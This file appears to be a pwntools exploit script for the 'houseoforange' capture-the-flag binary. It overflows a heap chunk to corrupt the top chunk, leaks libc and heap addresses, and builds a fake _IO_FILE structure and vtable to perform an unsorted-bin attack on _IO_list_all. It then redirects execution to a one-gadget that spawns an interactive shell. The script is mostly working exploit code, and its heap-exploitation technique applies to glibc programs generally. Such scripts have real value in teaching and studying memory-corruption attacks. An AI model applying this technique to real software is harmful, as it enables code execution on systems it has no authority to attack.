from pwn import *

context.log_level = "debug"

p = process("./houseoforange")

def build(length, name, price, color):

    p.sendline("1")
    print p.recv()
    p.sendline(str(length))
    print p.recv()
    p.send(name)
    print p.recv()
    p.send(price)
    print p.recv()
    p.sendline(str(color))
    print p.recv()

def see():
    
    p.sendline("2")
    return p.recv()

def upgrade(length,name, price, color):

    p.sendline("3")
    print p.recv()
    p.sendline(str(length))
    print p.recv()
    p.send(name)
    print p.recv()
    p.send(price)
    print p.recv()
    p.sendline(str(color))

build(0x20,"a"*0x20,str(30),5)
upgrade(0x50,"x"*0x20 + p64(0) + p64(0x21) + "a"*24 + p64(0xf91),str(30),5)
#0xf91 is the smallest feeding condition.
#over flow topchunk to create a new topchunk with a unsorted bin.
build(0x1000, "a"*0x1000, str(30),5)

#leak!
build(2000, "a"*7 + "\n", str(30),5)

leak = see()
libc = u64(leak.split("\n")[1][:6].ljust(0x8,"\x00")) - 0x3c5188
malloc_hook = libc + 0x3c4b10
one_gadget = libc + 0x4525a
unsorted_bin = libc + 0x3c4b78
io_file_all = libc + 0x3c5520 #will be refered as pointer to stderr.
system = libc + 0x45390
print "libc: " + hex(libc)

#leak heap
upgrade(0x10, "a"*16, str(30),5)
leak=see()
heap = u64(leak.split("a"*16)[1][:6].ljust(8,"\x00")) - 0xd0
print hex(heap)

#unsorted bin atk!
vtable_addr = heap + 0x9c8
payload = "a"*2000 + p64(0) + p64(0x21) + p64(0) * 2 + "/bin/sh\x00" + p64(0x61)

fake_fp = p64(0xddaa) + p64(io_file_all - 0x10)
fake_fp += p64(0x1)
fake_fp += p64(0x2)
fake_fp = fake_fp.ljust(0xa0, "\x00")
fake_fp += p64(heap + 0x9d8 - 0x108)
fake_fp = fake_fp.ljust(0xc0, "\x00")
fake_fp += p64(1)

payload += fake_fp
payload += p64(vtable_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(0) * 3
payload += p64(one_gadget)

upgrade(len(payload), payload, str(30), 5)
p.interactive()
